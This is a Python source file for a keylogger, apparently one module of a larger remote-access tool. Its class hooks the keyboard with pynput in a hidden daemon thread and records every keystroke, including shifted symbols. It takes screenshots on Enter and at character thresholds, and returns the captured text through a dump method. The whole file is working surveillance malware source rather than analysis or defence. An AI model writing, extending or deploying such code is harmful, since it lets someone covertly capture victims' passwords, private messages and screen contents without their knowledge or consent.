# Date: 09/30/2018
# Author: Pure-L0G1C
# Description: Keylogger

from time import sleep 
from threading import Thread
from lib.screen import Screenshot
from lib.const import KeyloggerConst
from pynput.keyboard import Key, Listener
 

class Keylogger:  

    def __init__(self, screen):
        self.data = []
        self.chars = 0
        self._chars = 0
        self.lastkey = None
        self.listener = None
        self.is_alive = True
        self.screen = screen
        self.is_running = False 

        self.num_to_symbol = {
         '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
         '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
        }

        self.sym_to_symbol = {
         '`': '~', ',': '<', '.': '>', '/': '?', '\'': '\"', '\\': '|',
         ';':  ':', '[': '{', ']': '}', '-': '_', '=': '+'
        }

    def _start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()

    def start(self):
        Thread(target=self._start, daemon=True).start()

    def stop(self):
        self.listener.stop()
        self.is_alive = False

    def dump(self):
        data = ''
        if not self.is_empty():
            data = ''.join(self.data)
            self.screen.capture_img()
            
        self.data = []
        return data if data else '-1'

    def on_release(self, key):
        if any([key == Key.shift, key == Key.shift_r]):
            self.lastkey = None

    def on_press(self, key):
        value = None
        if key == Key.backspace:
            if len(self.data):
                del self.data[-1]

        elif key == Key.tab:
            value = '\t'

        elif key == Key.enter:
            value = '\n'
            self.screen.capture_img()            

        elif key == Key.space:
            value = ' '

        elif len(str(key)) == 3:
            value = self.check_for_shift(key)

        else:
            self.lastkey = key

        if value != None:
            self.chars += 1
            self._chars += 1
            self.data.append(value)
            
            if self.chars >= KeyloggerConst.MAX_CHARS.value:
                self.screen.capture_img()
                self.chars = 0

    def check_for_shift(self, key):
        key = key.char
        if any([self.lastkey == Key.shift, self.lastkey == Key.shift_r]):
            key = (key.upper() if key.isalpha() else self.num_to_symbol[key] if
                   key.isdigit() else self.sym_to_symbol[key] if key in self.sym_to_symbol else key)
        return key

    def is_empty(self):
        is_empty = True
        for data in self.data:
            if data.strip():
                is_empty = False
                break
        return is_empty      